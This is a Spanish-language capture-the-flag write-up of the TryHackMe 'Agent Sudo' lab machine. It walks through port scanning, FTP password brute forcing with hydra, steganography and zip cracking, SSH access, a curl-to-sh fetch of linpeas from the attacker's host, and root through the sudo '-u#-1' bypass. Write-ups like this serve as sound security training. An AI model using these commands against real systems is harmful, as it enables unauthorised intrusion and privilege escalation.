---
title: Try Hack Me Agent Sudo
author: k4miyo
date: 2023-06-20
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Web, SSH, FTP,]
ping: true
---

## Máquina Agent Sudo
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP (ip address).

```bash
❯ ping -c 1 10.10.44.30
PING 10.10.44.30 (10.10.44.30) 56(84) bytes of data.
64 bytes from 10.10.44.30: icmp_seq=1 ttl=63 time=173 ms

--- 10.10.44.30 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 172.653/172.653/172.653/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.44.30 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 20:43 CST
Initiating Parallel DNS resolution of 1 host. at 20:43
Completed Parallel DNS resolution of 1 host. at 20:43, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:43
Scanning 10.10.44.30 [65535 ports]
Discovered open port 21/tcp on 10.10.44.30
Discovered open port 80/tcp on 10.10.44.30
Discovered open port 22/tcp on 10.10.44.30
Completed SYN Stealth Scan at 20:43, 19.05s elapsed (65535 total ports)
Nmap scan report for 10.10.44.30
Host is up, received user-set (0.18s latency).
Scanned at 2023-06-19 20:43:28 CST for 19s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
           Raw packets sent: 93878 (4.131MB) | Rcvd: 93773 (3.751MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬──────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.44.30
   5   │     [*] Open ports: 21,22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,22,80 10.10.44.30 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 20:45 CST
Nmap scan report for 10.10.44.30
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
```

Podríamos validar el puerto 21, sin embargo, no tenemos acceso como el usuario **anonymous**. Validando el puerto 80, ejecutamos un `whatweb`:

```bash
❯ whatweb http://10.10.44.30/
http://10.10.44.30/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.44.30], Title[Annoucement]
```

No vemos nada interesante, así que visualizaremos el contenido vía web:

![""](/assets/images/thm-agentsudo/agentsudo1.png)

En el mesaje vía web, nos indica que introduzcamos el **codename** en el campo ***user-agent*** y nos lo indica el agente **R**; por lo que es posible que si cambiamos el user-agent por "R" nos pueda mostrar una pista:

```bash
❯ curl http://10.10.44.30/ -H "User-Agent:R"
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

Vemos que nos arroja un mensaje al inicio diciendo que si somos uno de los 25 empleados y como vemos que si agregamos **R** en el user-agent nos da otra respuesta; podríamos tratar de búscar alguna letra del abecedario que nos genero otra respuesta.

![""](/assets/images/thm-agentsudo/agentsudo.png)

Mediante la herramienta **BurpSuite** vemos que para la letra **C** nos genera un código de estado 302, es decir, nos redirecciona:

![""](/assets/images/thm-agentsudo/agentsudo2.png)

Vemos que nos redirecciona a http://10.10.175.93/agent_C_attention.php y se nos muestra un potencial usuario: **chris**; asi mismo, no indica que que hablemos con el agente **J** y que nuestra contraseña es insegura. Ahora, podriamos tratar de realizar un ataque de fuerza bruta sobre el usuario **chris** y el puerto 21:

```bash
❯ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.175.93
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-20 21:24:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.175.93:21/
[STATUS] 249.00 tries/min, 249 tries in 00:01h, 14344150 to do in 960:08h, 16 active
[21][ftp] host: 10.10.175.93   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-20 21:25:39
```

Ya tenemos acceso vía ftp, así que vamos a ver los recursos que se encuentran:

```bash
❯ ftp 10.10.175.93
Connected to 10.10.175.93.
220 (vsFTPd 3.0.3)
Name (10.10.175.93:k4miyo): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
mget To_agentJ.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (46.1284 kB/s)
mget cute-alien.jpg? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.16 secs (203.3334 kB/s)
mget cutie.png? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.16 secs (216.7789 kB/s)
ftp>
```

Le echamos un ojo al recurso txt:

```bash
❯ catn To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

El mensaje nos dice que busquemos algo entre las imágenes que descargamos del servicio ftp para encontrar la contraseña del usuario **J**; así que vamos a echarles un ojo:

```bash
❯ exiftool cute-alien.jpg
ExifTool Version Number         : 12.16
File Name                       : cute-alien.jpg
Directory                       : .
File Size                       : 32 KiB
File Modification Date/Time     : 2023:06:20 21:28:09-06:00
File Access Date/Time           : 2023:06:20 21:28:09-06:00
File Inode Change Date/Time     : 2023:06:20 21:28:09-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220
❯ exiftool cutie.png
ExifTool Version Number         : 12.16
File Name                       : cutie.png
Directory                       : .
File Size                       : 34 KiB
File Modification Date/Time     : 2023:06:20 21:28:11-06:00
File Access Date/Time           : 2023:06:20 21:28:10-06:00
File Inode Change Date/Time     : 2023:06:20 21:28:11-06:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
```

No vemos nada interesante, así que vamos a utilizar otras herramientas:

```bash
❯ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

❯ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Vemos que la imagen **cutie.png** tiene un archivo zip oculto, así que vamos a extraerlo:

```bash
❯ binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

❯ ll
drwxr-xr-x root root  64 B  Tue Jun 20 21:38:00 2023  _cutie.png.extracted
.rw-r--r-- root root  32 KB Tue Jun 20 21:28:09 2023  cute-alien.jpg
.rw-r--r-- root root  34 KB Tue Jun 20 21:28:11 2023  cutie.png
.rw-r--r-- root root 217 B  Tue Jun 20 21:28:07 2023  To_agentJ.txt
❯ cd _cutie.png.extracted
❯ ll
.rw-r--r-- root root 273 KB Tue Jun 20 21:37:59 2023  365
.rw-r--r-- root root  33 KB Tue Jun 20 21:37:59 2023  365.zlib
.rw-r--r-- root root 280 B  Tue Jun 20 21:38:00 2023  8702.zip
.rw-r--r-- root root   0 B  Tue Oct 29 06:29:11 2019  To_agentR.txt
```

Tenemos un archivo zip el cual presenta contraseña, por lo que utilizaremos `zip2john` para obtener el hash del archivo y posteriormente crackearlo y tener la contraseña:

```bash
❯ zip2john 8702.zip > hashes
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2023-06-20 21:41) 5.882g/s 192752p/s 192752c/s 192752C/s 123456..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Vamos a extraer el contenido del archivo comprimido:

```bash

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 PRO 4750G with Radeon Graphics (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 06:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 06:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```

Nos dice que se tiene el contenido en el archivo `To_agentR.txt`, vamos a echarle un ojo:

```bash
❯ catn To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Vemos que tenemos que mandar el mensaje a **QXJlYTUx**, por lo que primero vamos a decodificarlo para saber el nombre real del usuario con [CyberChef](https://gchq.github.io/CyberChef/):

![""](/assets/images/thm-agentsudo/agentsudo3.png)

Tenemos la decodificación y nos hace mención de una imagen, por lo que es posible que la imagen contenga algún otro recurso el cual se necesite alguna contraseña para obtenerlo:

```bash
❯ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```

Leyendo el contenido del archivo `message.txt`:

```bash
❯ catn message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Ya tenemos las credenciales del usuario **james** y podemos tratar de acceder vía ssh:

```bash
❯ ssh james@10.10.175.93
The authenticity of host '10.10.175.93 (10.10.175.93)' can't be established.
ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.175.93' (ECDSA) to the list of known hosts.
james@10.10.175.93's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 21 03:58:43 UTC 2023

  System load:  0.0               Processes:           94
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.175.93
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ whoami
james
james@agent-sudo:~$
```

A este punto ya podemos visualizar la primera flag (user.txt). Ahora debemos buscar alguna manera de escalar privilegios:

```bash
james@agent-sudo:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$
```

No vemos nada interesante, ya que aunque estamos en el grupo **sudo** no podemos desplegarnos una **bash**. Vamos utiliar la herramienta [PEASS-ng](https://github.com/carlospolop/PEASS-ng/releases/tag/20230618-1fa055b6):

```bash
❯ ll
.rw-r--r-- k4miyo k4miyo 816 KB Thu Jun 22 20:46:27 2023  linpeas.sh
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.121.147 - - [22/Jun/2023 20:49:55] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
james@agent-sudo:~$ curl http://10.9.85.95:8000/linpeas.sh | sh
curl http://10.9.85.95:8000/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
 10  816k   10 88044    0     0   133k      0  0:00:06 --:--:--  0:00:06  133k
                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                          |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username
...
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-55-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.3 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
...
```

Observamos la vulnerabilidad para la versión de sudo, por lo que vamos al link que nos comparte [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version):

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
[sudo] password for james: 
root@agent-sudo:~# whoami
root
root@agent-sudo:~#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).